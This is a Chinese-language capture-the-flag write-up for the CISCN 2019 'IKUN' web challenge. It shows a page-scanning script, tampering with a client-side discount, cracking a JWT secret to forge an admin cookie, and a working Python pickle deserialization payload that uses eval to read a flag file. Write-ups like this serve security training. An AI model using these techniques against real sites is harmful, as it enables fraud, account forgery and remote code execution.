# IKUN
<font size=4>
docker地址

> https://github.com/CTFTraining/ciscn_2019_web_northern_china_day1_web2.git

打开题目，找到重点。

![](./image/ikun_1.png)

必须要求买到6级。翻了几页没找见六级的
	
	import requests
	
	url = "http://web44.buuoj.cn/"
	
	for i in range(1, 2000):
	    r = requests.get(url + "shop?page=" + str(i))
	
	    if r.text.find("lv6.png") != -1:
	        print(i)
	        break

使用这个脚本可以找到lv6在第181页。

购买之后到购物车里面，发现有个折扣，F12一下

![](./image/ikun_2.png)

将折扣改为很小的数字，然后结算，发现转到了/b1g_m4mber，并且显示没有权限。

![](./image/ikun_3.png)

查找cookie，发现有一个jwt的cookie。去官网解码

![](./image/ikun_4.png)

思路是将username改成admin，这时候要去爆破密钥，使用jwt-cracker工具

![](./image/ikun_5.png)

密钥为`1Kun`。将加密后的cookie保存后就可以访问刚才的界面。F12发现存在源码，下载下来。

![](./image/ikun_6.png)

下载源码后发现

    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)

存在反序列化。
使用如下脚本生成payload。

	import pickle
	import urllib
	
	class payload(object):
	    def __reduce__(self):
	       return (eval, ("open('/flag.txt','r').read()",))
	
	a = pickle.dumps(payload())
	print(a)
在刷新就可以看到flag。